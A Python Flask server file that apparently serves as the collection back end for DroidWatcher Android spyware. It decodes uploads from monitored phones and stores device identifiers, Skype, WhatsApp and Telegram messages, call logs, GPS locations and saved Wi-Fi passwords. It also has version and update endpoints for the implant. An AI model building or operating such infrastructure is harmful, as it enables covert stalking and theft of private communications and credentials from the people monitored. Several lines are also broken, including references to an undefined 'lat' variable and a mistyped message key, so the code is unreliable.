import zlib
import base64
import traceback
import json
import datetime
import unicodedata

from flask import Flask, jsonify, abort, request, make_response, url_for


from curiosus import db, app
from curiosus.models import Location, WirelessPassword, Device, SkypeAuthor, SkypeMessage, WhatsAppAuthor, WhatsAppMessage, TelegramAuthor, TelegramMessage

LATEST_VERSION = 5000
LATEST_VERSION_FILE = 'FILE'
LATEST_VERSION_CHECKSUM = 'BANANA'

def remove_control_characters(s):
    return "".join(ch for ch in s if unicodedata.category(ch)[0]!="C")


def timestamp_to_date(timestamp, miliseconds=True, **kwargs):
    try:
        date = datetime.datetime.fromtimestamp(int(timestamp))
    except:
        date = datetime.datetime.fromtimestamp(int(timestamp)/1000.0)
    return date

def log(module, date, msg):
    date = timestamp_to_date(date)
    print('[{module}] [{date}] {msg}'.format(module=module, date=date, msg=msg))

def handle_device_info(body):
    print("*** DEVICE INFO ***")
    print("Serial: {}".format(body['serial']))
    print("Brand: {}".format(body['brand']))
    print("Model: {}".format(body['model']))
    print("IMEI: {}".format(body['imei']))
    print("Number: {}".format(body['number']))
    print("Android Version: {}".format(body['os']))
    print("Email List: {}".format(', '.join(list(set(body['email_list'].split('|')))).lstrip(', ')))
    print("DroidWatcher Version: {}".format(body['ver']))
    print("Root: {}".format(body['root']))

    d = Device.query.filter_by(serial=body['serial']).first()

    if d:
        d.brand = body['brand']
        d.model = body['model']
        d.imei = body['imei']
        d.android_version = body['os']
        d.email_list = body['email_list']
        d.droidwatcher_version = body['ver']
        d.root = body['root']
        d.number = body['number']
    else:
        d = Device(serial=body['serial'], brand=body['brand'], model=body['model'], imei=body['imei'], number=body['number'], android_version=body['os'], email_list=body['email_list'], droidwatcher_version=body['ver'], root=body['root'])
    try:
        db.session.merge(d)
        db.session.commit()
    except Exception as e:
        traceback.print_exc()

def handle_skype(body):
    for message in body['body']:
        print('*** SKYPE MESSAGE ***')
        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['username']))
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Text: {}'.format(message['text']))
        print()
        d = Device.query.filter_by(imei=body['imei']).first()

        aobj = message['author']
   
        a = SkypeAuthor.query.filter_by(username=aobj['username']).first()

        if not a:

            a = SkypeAuthor(username=aobj['username'], fullname=aobj['fullname'], country=aobj['country'], birthday=aobj['birthday'], gender=aobj['gender'], province=aobj['province'], city=aobj['city'], phone=aobj['phone'], homepage=aobj['homepage'], about=aobj['about'], mood=aobj['mood'], external_id=aobj['uid'])

        try:
            db.session.merge(a)
            db.session.commit()
        except Exception as e:
            traceback.print_exc()


        a = SkypeAuthor.query.filter_by(username=aobj['username']).first()

        if a:
            m = SkypeMessage(author=a.username, date=timestamp_to_date(message['date']), text=message['text'], message_type=message['type'], extra=message['extra'], external_id=message['external_id'], latitude=message['lat'], longitude=lat['lon'], device=d.serial)

            try:
                db.session.add(m)
                db.session.commit()
            except Exception as e:
                traceback.print_exc()


def handle_whatsapp(body):
    for message in body['body']:
        print('*** WHATSAPP MESSAGE ***')
        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['uid']))
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Direction: {}'.format(message['type']))
        print('Text: {}'.format(message['text']))
        print()
        d = Device.query.filter_by(imei=body['imei']).first()

        aobj = message['author']
   
        a = WhatsAppAuthor.query.filter_by(phone=aobj['phone']).first()

        if not a:

            a = WhatsAppAuthor(external_id=aobj['uid'], fullname=aobj['fullname'], mood=aobj['mood'], phone=aobj['phone'])

        try:
            db.session.merge(a)
            db.session.commit()
        except Exception as e:
            traceback.print_exc()


        a = WhatsAppAuthor.query.filter_by(phone=aobj['phone']).first()

        if a:
            m = WhatsAppMessage(author=a.phone, date=timestamp_to_date(message['date']), text=message['text'], message_type=message['type'], external_id=message[',id'], latitude=message['lat'], longitude=lat['lon'], device=d.serial)

            try:
                db.session.add(m)
                db.session.commit()
            except Exception as e:
                traceback.print_exc()

def handle_telegram(body):
    for message in body['body']:
        print('*** TELEGRAM MESSAGE ***')
        print('Name: {} ({})'.format(message['author']['fullname'], message['author']['uid']))
        print('Date: {}'.format(timestamp_to_date(message['date'], convert=False)))
        print('Direction: {}'.format(message['type']))
        text = 'W'.join(''.join([chr(x) for x in message['text'].encode('utf-8') if unicodedata.category(chr(x)) != 'Cc']).split('W')[1:])
        text = text.encode('utf-8').decode('utf-8')
        print('Text: {}'.format(text))
        print()
        d = Device.query.filter_by(imei=body['imei']).first()

        aobj = message['author']
   
        a = TelegramAuthor.query.filter_by(external_id=aobj['uid']).first()

        if not a:

            a = TelegramAuthor(external_id=aobj['uid'], fullname=aobj['fullname'], extra=aobj['extra'])

        try:
            db.session.merge(a)
            db.session.commit()
        except Exception as e:
            traceback.print_exc()


        a = TelegramAuthor.query.filter_by(external_id=aobj['uid']).first()

        if a:
            m = TelegramMessage(author=a.external_id, date=timestamp_to_date(message['date']), text=text, message_type=message['type'], external_id=message['mid'], latitude=message['lat'], longitude=message['lon'], device=d.serial)

            try:
                db.session.add(m)
                db.session.commit()
            except Exception as e:
                traceback.print_exc()

def handle_call(body):
    for message in body['body']:
        print('*** CALL ***')
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Name: {}'.format(message['name']))
        print('Number: {}'.format(message['number']))
        try:
            print('Lat/Lon: {}/{}'.format(message['lat'], message['lon']))
        except:
            pass
        print('Duration: {}'.format(message['duration']))
        print()

def handle_location(body):
    for message in body['body']:
        print('*** LOCATION ***')
        print('Date: {}'.format(timestamp_to_date(message['date'])))
        print('Lat/Lon: {}/{}'.format(message['lat'], message['lon']))
        print('Battery: {}'.format(message['battery']))
        print('Provider: {}'.format(message['provider']))
        print()

        #log('LOCATION', location['date'], 'LAT/LON: {lat}/{lon} | Battery: {battery}'.format(**location)) 

        d = Device.query.filter_by(imei=body['imei']).first()

        l = Location(date=timestamp_to_date(message['date']), latitude=message['lat'], longitude=message['lon'], battery=message['battery'], provider=message['provider'], device=d.serial)


        try:
            db.session.add(l)
            db.session.commit()
        except:
            traceback.print_exc()

def handle_wireless_password(body):
    for message in body['body']:
        print('*** WIRELESS PASSWORD ***')
        print('ESSID: {}'.format(message['essid']))
        print('Password: {}'.format(message['password']))
        print('Key Management: {}'.format(message['key_mgmt']))
        print()
        d = Device.query.filter_by(imei=body['imei']).first()

        wp = WirelessPassword(device=d.serial, date=message.get('date', datetime.datetime.now()), key_management=message['key_mgmt'], latitude=message['lat'], longitude=message['lon'], essid=message['essid'], password=message['password'])
        try:
            db.session.add(wp)
            db.session.commit()
        except:
            traceback.print_exc()

@app.route('/api/v1/version')
def version():
    return jsonify({'version': LATEST_VERSION, 'file': LATEST_VERSION_FILE, 'sha256': LATEST_VERSION_CHECKSUM})


@app.route('/api/v1/update')
def update():
    return 'ok'



@app.route('/api/v1/service', methods=['GET', 'POST'])
def service():
    if not request.json:
        abort(400)
    module = request.headers.get('Endpoint')
    print('Got request for endpoint {}'.format(module))
    body = json.loads(zlib.decompress(base64.b64decode(request.json.get('data')), zlib.MAX_WBITS|16).decode('utf-8'))
    if module in ['DEVICE_INFO']:
        handle_device_info(body)
        return 'ok'
    elif module in ['SETTINGS_SEND']:
        #print(data)
        return 'ok'
    
    try:
        if module in ['GPS', 'ONLINE_LOCATION']:
            handle_location(body)
        elif module in ['WA']:
            handle_whatsapp(body)
        elif module in ['TELEGRAM']:
            handle_telegram(body)
        elif module in ['CALL']:
            handle_call(body)
        elif module in ['SKYPE']:
            handle_skype(body)
        elif module in ['WIRELESS_PASSWORD']:
            handle_wireless_password(body)
    except Exception as e:
        traceback.print_exc()
    return 'ok'
